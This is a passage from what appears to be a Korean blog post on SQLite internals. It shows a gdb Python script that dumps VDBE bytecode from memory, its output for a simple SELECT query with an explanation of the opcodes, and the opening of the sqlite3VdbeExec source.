</span></span><span style="display:flex;"><span>OP_OpenDup       <span style="color:#f92672">=</span><span style="color:#ae81ff">115</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_OpenAutoindex <span style="color:#f92672">=</span><span style="color:#ae81ff">116</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: nColumn=P2                       */</span>
</span></span><span style="display:flex;"><span>OP_String8       <span style="color:#f92672">=</span><span style="color:#ae81ff">117</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_STRING, synopsis: r[P2]=&#39;P4&#39;    */</span>
</span></span><span style="display:flex;"><span>OP_OpenEphemeral <span style="color:#f92672">=</span><span style="color:#ae81ff">118</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: nColumn=P2                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterOpen    <span style="color:#f92672">=</span><span style="color:#ae81ff">119</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_SequenceTest  <span style="color:#f92672">=</span><span style="color:#ae81ff">120</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: if( cursor[P1].ctr++ ) pc = P2   */</span>
</span></span><span style="display:flex;"><span>OP_OpenPseudo    <span style="color:#f92672">=</span><span style="color:#ae81ff">121</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: P3 columns in r[P2]              */</span>
</span></span><span style="display:flex;"><span>OP_Close         <span style="color:#f92672">=</span><span style="color:#ae81ff">122</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ColumnsUsed   <span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_SeekScan      <span style="color:#f92672">=</span><span style="color:#ae81ff">124</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: Scan-ahead up to P1 rows         */</span>
</span></span><span style="display:flex;"><span>OP_SeekHit       <span style="color:#f92672">=</span><span style="color:#ae81ff">125</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: set P2&lt;=seekHit&lt;=P3              */</span>
</span></span><span style="display:flex;"><span>OP_Sequence      <span style="color:#f92672">=</span><span style="color:#ae81ff">126</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=cursor[P1].ctr++           */</span>
</span></span><span style="display:flex;"><span>OP_NewRowid      <span style="color:#f92672">=</span><span style="color:#ae81ff">127</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=rowid                      */</span>
</span></span><span style="display:flex;"><span>OP_Insert        <span style="color:#f92672">=</span><span style="color:#ae81ff">128</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: intkey=r[P3] data=r[P2]          */</span>
</span></span><span style="display:flex;"><span>OP_RowCell       <span style="color:#f92672">=</span><span style="color:#ae81ff">129</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Delete        <span style="color:#f92672">=</span><span style="color:#ae81ff">130</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ResetCount    <span style="color:#f92672">=</span><span style="color:#ae81ff">131</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_SorterCompare <span style="color:#f92672">=</span><span style="color:#ae81ff">132</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_SorterData    <span style="color:#f92672">=</span><span style="color:#ae81ff">133</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=data                       */</span>
</span></span><span style="display:flex;"><span>OP_RowData       <span style="color:#f92672">=</span><span style="color:#ae81ff">134</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=data                       */</span>
</span></span><span style="display:flex;"><span>OP_Rowid         <span style="color:#f92672">=</span><span style="color:#ae81ff">135</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=PX rowid of P1             */</span>
</span></span><span style="display:flex;"><span>OP_NullRow       <span style="color:#f92672">=</span><span style="color:#ae81ff">136</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_SeekEnd       <span style="color:#f92672">=</span><span style="color:#ae81ff">137</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_IdxInsert     <span style="color:#f92672">=</span><span style="color:#ae81ff">138</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: key=r[P2]                        */</span>
</span></span><span style="display:flex;"><span>OP_SorterInsert  <span style="color:#f92672">=</span><span style="color:#ae81ff">139</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: key=r[P2]                        */</span>
</span></span><span style="display:flex;"><span>OP_IdxDelete     <span style="color:#f92672">=</span><span style="color:#ae81ff">140</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: key=r[P2@P3]                     */</span>
</span></span><span style="display:flex;"><span>OP_DeferredSeek  <span style="color:#f92672">=</span><span style="color:#ae81ff">141</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: Move P3 to P1.rowid if needed    */</span>
</span></span><span style="display:flex;"><span>OP_IdxRowid      <span style="color:#f92672">=</span><span style="color:#ae81ff">142</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=rowid                      */</span>
</span></span><span style="display:flex;"><span>OP_FinishSeek    <span style="color:#f92672">=</span><span style="color:#ae81ff">143</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Destroy       <span style="color:#f92672">=</span><span style="color:#ae81ff">144</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Clear         <span style="color:#f92672">=</span><span style="color:#ae81ff">145</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ResetSorter   <span style="color:#f92672">=</span><span style="color:#ae81ff">146</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_CreateBtree   <span style="color:#f92672">=</span><span style="color:#ae81ff">147</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=root iDb=P1 flags=P3       */</span>
</span></span><span style="display:flex;"><span>OP_SqlExec       <span style="color:#f92672">=</span><span style="color:#ae81ff">148</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ParseSchema   <span style="color:#f92672">=</span><span style="color:#ae81ff">149</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_LoadAnalysis  <span style="color:#f92672">=</span><span style="color:#ae81ff">150</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_DropTable     <span style="color:#f92672">=</span><span style="color:#ae81ff">151</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_DropIndex     <span style="color:#f92672">=</span><span style="color:#ae81ff">152</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Real          <span style="color:#f92672">=</span><span style="color:#ae81ff">153</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* same as TK_FLOAT, synopsis: r[P2]=P4       */</span>
</span></span><span style="display:flex;"><span>OP_DropTrigger   <span style="color:#f92672">=</span><span style="color:#ae81ff">154</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_IntegrityCk   <span style="color:#f92672">=</span><span style="color:#ae81ff">155</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_RowSetAdd     <span style="color:#f92672">=</span><span style="color:#ae81ff">156</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: rowset(P1)=r[P2]                 */</span>
</span></span><span style="display:flex;"><span>OP_Param         <span style="color:#f92672">=</span><span style="color:#ae81ff">157</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_FkCounter     <span style="color:#f92672">=</span><span style="color:#ae81ff">158</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: fkctr[P1]+=P2                    */</span>
</span></span><span style="display:flex;"><span>OP_MemMax        <span style="color:#f92672">=</span><span style="color:#ae81ff">159</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P1]=max(r[P1],r[P2])           */</span>
</span></span><span style="display:flex;"><span>OP_OffsetLimit   <span style="color:#f92672">=</span><span style="color:#ae81ff">160</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: if r[P1]&gt;0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */</span>
</span></span><span style="display:flex;"><span>OP_AggInverse    <span style="color:#f92672">=</span><span style="color:#ae81ff">161</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: accum=r[P3] inverse(r[P2@P5])    */</span>
</span></span><span style="display:flex;"><span>OP_AggStep       <span style="color:#f92672">=</span><span style="color:#ae81ff">162</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: accum=r[P3] step(r[P2@P5])       */</span>
</span></span><span style="display:flex;"><span>OP_AggStep1      <span style="color:#f92672">=</span><span style="color:#ae81ff">163</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: accum=r[P3] step(r[P2@P5])       */</span>
</span></span><span style="display:flex;"><span>OP_AggValue      <span style="color:#f92672">=</span><span style="color:#ae81ff">164</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=value N=P2                 */</span>
</span></span><span style="display:flex;"><span>OP_AggFinal      <span style="color:#f92672">=</span><span style="color:#ae81ff">165</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: accum=r[P1] N=P2                 */</span>
</span></span><span style="display:flex;"><span>OP_Expire        <span style="color:#f92672">=</span><span style="color:#ae81ff">166</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_CursorLock    <span style="color:#f92672">=</span><span style="color:#ae81ff">167</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_CursorUnlock  <span style="color:#f92672">=</span><span style="color:#ae81ff">168</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_TableLock     <span style="color:#f92672">=</span><span style="color:#ae81ff">169</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: iDb=P1 root=P2 write=P3          */</span>
</span></span><span style="display:flex;"><span>OP_VBegin        <span style="color:#f92672">=</span><span style="color:#ae81ff">170</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VCreate       <span style="color:#f92672">=</span><span style="color:#ae81ff">171</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VDestroy      <span style="color:#f92672">=</span><span style="color:#ae81ff">172</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VOpen         <span style="color:#f92672">=</span><span style="color:#ae81ff">173</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VCheck        <span style="color:#f92672">=</span><span style="color:#ae81ff">174</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_VInitIn       <span style="color:#f92672">=</span><span style="color:#ae81ff">175</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P2]=ValueList(P1,P3)           */</span>
</span></span><span style="display:flex;"><span>OP_VColumn       <span style="color:#f92672">=</span><span style="color:#ae81ff">176</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P3]=vcolumn(P2)                */</span>
</span></span><span style="display:flex;"><span>OP_VRename       <span style="color:#f92672">=</span><span style="color:#ae81ff">177</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Pagecount     <span style="color:#f92672">=</span><span style="color:#ae81ff">178</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_MaxPgcnt      <span style="color:#f92672">=</span><span style="color:#ae81ff">179</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ClrSubtype    <span style="color:#f92672">=</span><span style="color:#ae81ff">180</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: r[P1].subtype = 0                */</span>
</span></span><span style="display:flex;"><span>OP_FilterAdd     <span style="color:#f92672">=</span><span style="color:#ae81ff">181</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: filter(P1) += key(P3@P4)         */</span>
</span></span><span style="display:flex;"><span>OP_Trace         <span style="color:#f92672">=</span><span style="color:#ae81ff">182</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_CursorHint    <span style="color:#f92672">=</span><span style="color:#ae81ff">183</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_ReleaseReg    <span style="color:#f92672">=</span><span style="color:#ae81ff">184</span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#75715e">/* synopsis: release r[P1@P2] mask P3         */</span>
</span></span><span style="display:flex;"><span>OP_Noop          <span style="color:#f92672">=</span><span style="color:#ae81ff">185</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Explain       <span style="color:#f92672">=</span><span style="color:#ae81ff">186</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span>OP_Abortable     <span style="color:#f92672">=</span><span style="color:#ae81ff">187</span><span style="color:#960050;background-color:#1e0010">#</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>import gdb
</span></span><span style="display:flex;"><span>import <span style="color:#66d9ef">struct</span>
</span></span><span style="display:flex;"><span>opcode <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i,j in <span style="color:#a6e22e">enumerate</span>(v.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>))<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    opcode[i] <span style="color:#f92672">=</span> j.<span style="color:#a6e22e">split</span>()[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">187</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>gdb.<span style="color:#a6e22e">execute</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>brva <span style="color:#ae81ff">0x88E1</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>gdb.<span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#39;c&#39;</span>)
</span></span><span style="display:flex;"><span>rdi <span style="color:#f92672">=</span> (gdb.<span style="color:#a6e22e">parse_and_eval</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">int64_t</span> <span style="color:#f92672">*</span>)(<span style="color:#960050;background-color:#1e0010">$</span>rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">0x88</span>)<span style="color:#960050;background-color:#1e0010">&#39;</span>))
</span></span><span style="display:flex;"><span>inf <span style="color:#f92672">=</span> gdb.<span style="color:#a6e22e">selected_inferior</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> True:
</span></span><span style="display:flex;"><span>    mem <span style="color:#f92672">=</span> <span style="color:#a6e22e">bytes</span>(inf.<span style="color:#a6e22e">read_memory</span>(rdi, <span style="color:#ae81ff">0x18</span>))
</span></span><span style="display:flex;"><span>    p4_type <span style="color:#f92672">=</span> mem[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    p5 <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">&lt;</span>H<span style="color:#960050;background-color:#1e0010">&#39;</span>,mem[<span style="color:#ae81ff">2</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    p1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">&lt;</span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>,mem[<span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    p2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">&lt;</span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>,mem[<span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    p3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">&lt;</span>I<span style="color:#960050;background-color:#1e0010">&#39;</span>,mem[<span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#ae81ff">16</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    p4 <span style="color:#f92672">=</span> <span style="color:#66d9ef">struct</span>.<span style="color:#a6e22e">unpack</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">&lt;</span>Q<span style="color:#960050;background-color:#1e0010">&#39;</span>,mem[<span style="color:#ae81ff">16</span><span style="color:#f92672">:</span><span style="color:#ae81ff">24</span>])[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;{&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tOPCODE <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,opcode[mem[<span style="color:#ae81ff">0</span>]])
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp5 <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,p5)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp4_type <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,p4_type)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp4 <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#a6e22e">hex</span>(p4))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp1 <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#a6e22e">hex</span>(p1))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp2 <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#a6e22e">hex</span>(p2))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#960050;background-color:#1e0010">&#39;\</span>tp3 <span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&#39;</span>,<span style="color:#a6e22e">hex</span>(p3))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;}&#34;</span>)
</span></span><span style="display:flex;"><span>    rdi <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> mem[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">70</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span></code></pre></div><p>위 스크립트를 이용해서 몇가지 SQL에 대한 바이트 코드가 어떻게 점화되는지 확인했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SELECT <span style="color:#ae81ff">0x1234</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> source dump_ops.py 
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        OPCODE <span style="color:#f92672">=</span> OP_Init
</span></span><span style="display:flex;"><span>        p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span>        p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        OPCODE <span style="color:#f92672">=</span> OP_Integer
</span></span><span style="display:flex;"><span>        p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1244566</span>
</span></span><span style="display:flex;"><span>        p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        OPCODE <span style="color:#f92672">=</span> OP_ResultRow
</span></span><span style="display:flex;"><span>        p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>        OPCODE <span style="color:#f92672">=</span> OP_Halt
</span></span><span style="display:flex;"><span>        p5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4_type <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        p3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>OP_Init은 초기화 작업을 해주고 p2에 저장된 entrypoint로 뛰어주는 역할을 한다.
그리고 OP_ResultRow로 ResultRow를 지정한다.
마지막으로 OP_Halt로 vm 프로그램을 종료한다.</p>
<p>이러한 바이트 코드들은 sqlite3_step 내부에서 실행된다.
최종적으로 sqlite3VdbeExec이 호출된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SQLITE_PRIVATE <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">sqlite3VdbeExec</span>(
</span></span><span style="display:flex;"><span>  Vdbe <span style="color:#f92672">*</span>p                    <span style="color:#75715e">/* The VDBE */</span>
</span></span><span style="display:flex;"><span>){
</span></span><span style="display:flex;"><span>  Op <span style="color:#f92672">*</span>aOp <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>aOp;          <span style="color:#75715e">/* Copy of p-&gt;aOp */</span>
</span></span><span style="display:flex;"><span>  Op <span style="color:#f92672">*</span>pOp <span style="color:#f92672">=</span> aOp;             <span style="color:#75715e">/* Current operation */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Op <span style="color:#f92672">*</span>pOrigOp;               <span style="color:#75715e">/* Value of pOp at the top of the loop */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> nExtraDelete <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;      <span style="color:#75715e">/* Verifies FORDELETE and AUXDELETE flags */</span>
</span></span><span style="display:flex;"><span>  u8 iCompareIsInit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;     <span style="color:#75715e">/* iCompare is initialized */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> rc <span style="color:#f92672">=</span> SQLITE_OK;        <span style="color:#75715e">/* Value to return */</span>
</span></span><span style="display:flex;"><span>  sqlite3 <span style="color:#f92672">*</span>db <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>db;       <span style="color:#75715e">/* The database */</span>
</span></span><span style="display:flex;"><span>  u8 resetSchemaOnFault <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">/* Reset schema after an error if positive */</span>
</span></span><span style="display:flex;"><span>  u8 encoding <span style="color:#f92672">=</span> <span style="color:#a6e22e">ENC</span>(db);     <span style="color:#75715e">/* The database encoding */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iCompare <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;          <span style="color:#75715e">/* Result of last comparison */</span>
</span></span><span style="display:flex;"><span>  u64 nVmStep <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;           <span style="color:#75715e">/* Number of virtual machine steps */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifndef SQLITE_OMIT_PROGRESS_CALLBACK
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  u64 nProgressLimit;        <span style="color:#75715e">/* Invoke xProgress() when nVmStep reaches this */</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Mem <span style="color:#f92672">*</span>aMem <span style="color:#f92672">=</span> p<span style="color:#f92672">-&gt;</span>aMem;       <span style="color:#75715e">/* Copy of p-&gt;aMem */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pIn1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;             <span style="color:#75715e">/* 1st input operand */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pIn2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;             <span style="color:#75715e">/* 2nd input operand */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pIn3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;             <span style="color:#75715e">/* 3rd input operand */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pOut <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;             <span style="color:#75715e">/* Output operand */</span>
</span></span><span style="display:flex;"><span>  u32 colCacheCtr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;       <span style="color:#75715e">/* Column cache counter */</span>
